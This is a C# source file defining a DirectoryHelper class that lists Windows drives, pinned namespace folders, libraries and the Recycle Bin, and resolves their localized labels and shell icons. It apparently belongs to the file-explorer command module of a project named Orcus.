using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using Orcus.Native;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Utilities;
using ShellDll;

namespace Orcus.Commands.FileExplorer
{
    public class DirectoryHelper
    {
        public static List<PackedDirectoryEntry> GetNamespaceDirectories()
        {
#if !NET45
            if (CoreHelper.RunningOnXP)
                return new List<PackedDirectoryEntry>();
#endif
            var result = new Dictionary<PackedDirectoryEntry, int>();
            try
            {
                using (var rootKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\CLSID"))
                {
                    if (rootKey != null)
                        foreach (var subKeyName in rootKey.GetSubKeyNames())
                        {
                            using (var possibleEntryRegKey = rootKey.OpenSubKey(subKeyName))
                            {
                                if ((int?) possibleEntryRegKey?.GetValue("System.IsPinnedToNameSpaceTree", 0) != 1)
                                    continue;

                                using (var infoKey = possibleEntryRegKey.OpenSubKey("Instance\\InitPropertyBag"))
                                {
                                    var folder =
                                        (string)
                                            (infoKey?.GetValue("TargetFolderPath", null) ??
                                             infoKey?.GetValue("TargetKnownFolder"));
                                    if (folder == null)
                                        continue;

                                    PackedDirectoryEntry entry;
                                    using (var directory = new DirectoryInfoEx(folder))
                                        entry = GetDirectoryEntry(directory, null);

                                    if (entry == null)
                                        continue;

                                    var label = (string) possibleEntryRegKey.GetValue("");
                                    if (!string.IsNullOrEmpty(label))
                                        entry.Label = label;

                                    result.Add(entry,
                                        (int?) possibleEntryRegKey.GetValue("SortOrderIndex", null) ?? int.MaxValue - 1);
                                }
                            }
                        }
                }
            }
            catch (Exception)
            {
                // Requested registry access is not allowed
            }
            result.Add(GetDirectoryEntry(DirectoryInfoEx.RecycleBinDirectory, null), -1);

            return result.OrderBy(x => x.Value).Select(x => x.Key).ToList();
        }

        public static List<IFileExplorerEntry> GetComputerDirectoryEntries()
        {
#if !NET45
            if (CoreHelper.RunningOnXP)
                return
                    DriveInfo.GetDrives()
                        .Select(x => GetDirectoryEntry(new DirectoryInfoEx(x.RootDirectory.FullName), null))
                        .Cast<IFileExplorerEntry>()
                        .ToList();
#endif

            var entries = GetDirectoryEntries(DirectoryInfoEx.MyComputerDirectory);
            if (!CoreHelper.RunningOnWin8OrGreater)
            {
                bool success = false;
                try
                {
                    var librariesDirectory = new DirectoryInfoEx(KnownFolderIds.Libraries);
                    entries.InsertRange(0, librariesDirectory.GetDirectories().Select(x => GetDirectoryEntry(x, null)).Cast<IFileExplorerEntry>());
                    success = true;
                }
                catch (Exception)
                {
                    // ignored
                }

                if (!success)
                {
                    var musicEntry =
                        ExceptionUtilities.EatExceptions(
                            () =>
                                GetDirectoryEntry(
                                    new DirectoryInfoEx(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)),
                                    null));
                    if (musicEntry != null)
                        entries.Insert(0, musicEntry);

                    var documentsEntry =
                        ExceptionUtilities.EatExceptions(
                            () =>
                                GetDirectoryEntry(
                                    new DirectoryInfoEx(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)),
                                    null));
                    if (documentsEntry != null)
                        entries.Insert(0, documentsEntry);

                    var picturesEntry =
                        ExceptionUtilities.EatExceptions(
                            () =>
                                GetDirectoryEntry(
                                    new DirectoryInfoEx(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)),
                                    null));
                    if (picturesEntry != null)
                        entries.Insert(0, picturesEntry);

                }
            }

            return entries;
        }

        public static PackedDirectoryEntry GetDirectoryEntry(DirectoryInfoEx directory, string parentFolder)
        {
            if (!directory.Exists)
            {
                try
                {
                    var guid = new Guid(directory.FullName);
                    directory = new DirectoryInfoEx(KnownFolder.FromKnownFolderId(guid));
                    if (!directory.Exists)
                        return null;
                }
                catch (Exception)
                {
                    return null;
                }
            }

            PackedDirectoryEntry result;
            if (directory.DirectoryType == DirectoryInfoEx.DirectoryTypeEnum.dtDrive)
            {
                var drive = DriveInfo.GetDrives().FirstOrDefault(x => x.RootDirectory.FullName == directory.FullName);
                if (drive != null)
                    if (!drive.IsReady)
                        result = new DriveDirectoryEntry
                        {
                            TotalSize = 0,
                            UsedSpace = 0,
                            DriveType = (DriveDirectoryType) drive.DriveType
                        };
                    else
                        result = new DriveDirectoryEntry
                        {
                            TotalSize = drive.TotalSize,
                            UsedSpace = drive.TotalSize - drive.TotalFreeSpace,
                            DriveType = (DriveDirectoryType) drive.DriveType
                        };
                else
                    result = new PackedDirectoryEntry();
            }
            else
            {
                result = new PackedDirectoryEntry();
            }

            result.Name = directory.Name;
            result.HasSubFolder = directory.HasSubFolder;
            result.CreationTime = directory.CreationTimeUtc;
            result.LastAccess = directory.LastAccessTimeUtc;

            SetFolderLabelResource(directory, result);

            result.IconId = GetFolderIcon(directory);

            if ((parentFolder == null && directory.FullName != directory.Name) || parentFolder != ExceptionUtilities.EatExceptions(() => directory.FullName))
                result.Path = directory.FullName;

            return result;
        }

        public static List<IFileExplorerEntry> GetDirectoryEntries(string path)
        {
            using (var directory = new DirectoryInfoEx(path))
                return GetDirectoryEntries(directory);
        }

        public static List<IFileExplorerEntry> GetDirectoryEntries(DirectoryInfoEx directory)
        {
            var result = new List<IFileExplorerEntry>();

#if !NET45
            if (CoreHelper.RunningOnXP && ExceptionUtilities.EatExceptions<bool?>(() => Directory.Exists(directory.FullName)) == true)
            {
                foreach (var fileSystemInfo in new DirectoryInfo(directory.FullName).GetFileSystemInfos())
                {
                    if (fileSystemInfo is DirectoryInfo)
                    {
                        result.Add(GetDirectoryEntry(new DirectoryInfoEx(fileSystemInfo.FullName), directory.FullName));
                    }
                    else
                    {
                        result.Add(GetFileEntry(new FileInfoEx(fileSystemInfo.FullName), directory.FullName));
                    }
                }
                return result;
            }
#endif

            foreach (var fileSystemInfo in directory.EnumerateFileSystemInfos("*", SearchOption.TopDirectoryOnly))
            {
                using (fileSystemInfo)
                    if (fileSystemInfo.IsFolder)
                    {
                        result.Add(GetDirectoryEntry((DirectoryInfoEx) fileSystemInfo, directory.FullName));
                    }
                    else
                    {
                        result.Add(GetFileEntry((FileInfoEx) fileSystemInfo, directory.FullName));
                    }
            }

            return result;
        }

        public static List<PackedDirectoryEntry> GetDirectoriesFast(string path)
        {
            var result = new List<PackedDirectoryEntry>();
            foreach (var directory in new DirectoryInfo(path).GetDirectories())
            {
                result.Add(new PackedDirectoryEntry
                {
                    CreationTime = directory.CreationTimeUtc,
                    Name = directory.Name,
                    LastAccess = directory.LastAccessTimeUtc,
                    HasSubFolder = directory.GetDirectories().Length > 0
                });
            }

            return result;
        }

        public static List<PackedDirectoryEntry> GetDirectories(DirectoryInfoEx directory)
        {
            var result = new List<PackedDirectoryEntry>();
#if !NET45
            if (CoreHelper.RunningOnXP)
            {
                foreach (var directoryInfo in new DirectoryInfo(directory.FullName).GetDirectories())
                {
                    result.Add(GetDirectoryEntry(new DirectoryInfoEx(directoryInfo.FullName), directory.FullName));
                }
            }
            else
#endif
                foreach (var directoryInfoEx in directory.EnumerateDirectories("*", SearchOption.TopDirectoryOnly))
                {
                    result.Add(GetDirectoryEntry(directoryInfoEx, directory.FullName));
                }

            return result;
        }

        private static FileEntry GetFileEntry(FileInfoEx fileInfo, string parentFolder)
        {
            var result = new FileEntry
            {
                Name = fileInfo.Name,
                Size = fileInfo.Length,
                CreationTime = fileInfo.CreationTimeUtc,
                LastAccess = fileInfo.LastAccessTimeUtc
            };
            if (fileInfo.DirectoryName != parentFolder)
                result.Path = fileInfo.FullName;

#if !NET45
            if (CoreHelper.RunningOnXP)
                return result;
#endif

            if (fileInfo.Parent?.KnownFolderId == KnownFolderIds.RecycleBinFolder)
            {
                result.Path = fileInfo.FullName;
                result.Name = fileInfo.Label;
            }
            return result;
        }

        private static void SetFolderLabelResource(DirectoryInfoEx directory, PackedDirectoryEntry directoryEntry)
        {
#if !NET45
            if (CoreHelper.RunningOnXP) //SHGetLocalizedName is not supported on WinXP and everything else doesn't work
                return;
#endif

            if (directory.Name != directory.Label)
                directoryEntry.Label = directory.Label;

            try
            {
                if (!string.IsNullOrEmpty(directory.KnownFolderType?.Definition.LocalizedName))
                {
                    var parts = directory.KnownFolderType.Definition.LocalizedName.TrimStart('@').Split(',');
                    int id;
                    if (parts.Length == 2 && int.TryParse(parts[1], out id))
                    {
                        directoryEntry.LabelPath = parts[0];
                        directoryEntry.LabelId = id;
                        return;
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            //http://archives.miloush.net/michkap/archive/2007/01/18/1487464.html
            StringBuilder sb = new StringBuilder(500);
            int pidsRes;
            var len = (uint) sb.Capacity;
            if (NativeMethods.SHGetLocalizedName(directory.FullName, sb, ref len, out pidsRes) == IntPtr.Zero)
            {
                directoryEntry.LabelPath = sb.ToString();
                directoryEntry.LabelId = pidsRes;
            }
        }

        private static int GetFolderIcon(DirectoryInfoEx directory)
        {
            //must be at first because the files have an icon but that's no available in the administration
            switch (directory.Name.ToLower())
            {
                case "music.library-ms":
                    return -108;
                case "videos.library-ms":
                    return -189;
                case "documents.library-ms":
                    return -112;
                case "pictures.library-ms":
                    return -113;
            }

            try
            {
                var iconPath = directory.KnownFolderType?.Definition.Icon;
                if (!string.IsNullOrEmpty(iconPath))
                {
                    var parts = iconPath.Trim('"').Split(',');
                    int resultId;
                    if (parts.Length == 2 && parts[0].EndsWith("imageres.dll", StringComparison.OrdinalIgnoreCase) &&
                        int.TryParse(parts[1], out resultId))
                        return resultId;
                }
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                switch (directory.KnownFolderType?.KnownFolderId)
                {
                    case KnownFolderIds.ComputerFolder:
                        return -109;
                    case KnownFolderIds.RecycleBinFolder:
                        return -54;
                    case KnownFolderIds.NetworkFolder:
                        return -1013;
                }
            }
            catch (Exception)
            {
                // ignored
            }

            var shinfo = new SHFILEINFO();
            NativeMethods.SHGetFileInfo(directory.FullName, 0, ref shinfo, (uint) Marshal.SizeOf(shinfo),
                ShellAPI.SHGFI.ICONLOCATION);

            return shinfo.szDisplayName.EndsWith("imageres.dll", StringComparison.OrdinalIgnoreCase) ? shinfo.iIcon : 0;
        }
    }
}